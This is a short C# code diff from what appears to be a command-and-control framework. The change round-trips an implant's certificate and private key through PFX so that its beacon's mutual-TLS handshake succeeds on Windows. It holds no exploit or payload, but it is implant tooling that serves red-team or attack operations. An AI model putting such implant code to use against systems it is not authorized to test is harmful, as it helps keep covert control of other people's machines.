@@ -220,6 +220,14 @@ internal static class C2
         // Pair the issued leaf with the implant's own private key (the teamserver
         // signed over the public half; the private half never left the implant).
         var paired = leaf.CopyWithPrivateKey(privateKey);
+        // Materialize the pair through a PFX round-trip before handing it to the
+        // beacon: SChannel cannot present a certificate whose key association
+        // exists only as an in-memory handle, so on Windows the pairing above
+        // fails every mTLS handshake with "credentials not recognized". The PFX
+        // import leaves the pair in the store-shaped form every platform's TLS
+        // stack accepts; Linux behavior is unchanged.
+        paired = X509CertificateLoader.LoadPkcs12(
+            paired.Export(X509ContentType.Pfx), null);
 
         var cas = new List<X509Certificate2>();
         if (er.CaChain is { } caChain)
